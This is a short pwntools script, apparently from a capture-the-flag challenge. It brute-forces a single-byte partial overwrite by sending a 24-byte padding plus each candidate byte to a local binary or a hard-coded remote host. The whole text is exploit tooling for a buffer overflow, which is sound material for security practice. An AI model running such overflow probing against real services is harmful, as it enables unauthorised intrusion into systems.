from pwn import *
import  multiprocessing

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.141.229.188',1337)
    else:
        return process(e.path)

def check_partial(overwrite):
  p = start()
  chain = b'A'*24+chr(overwrite).encode()
  p.send(chain)
  time.sleep(2)
  p.recvuntil(b'Oooh you like')
  p.recvuntil(b'?')
  p.recvuntil(b'\n')
  try:
    print(overwrite,p.recvline())
  except:
    pass

R = 255
threads = []
for x in range(0,R):
    threads.append(multiprocessing.Process(target = check_partial, args=(x,)))
    threads[x].start()
for x in range(0,R):
    threads[x].join()

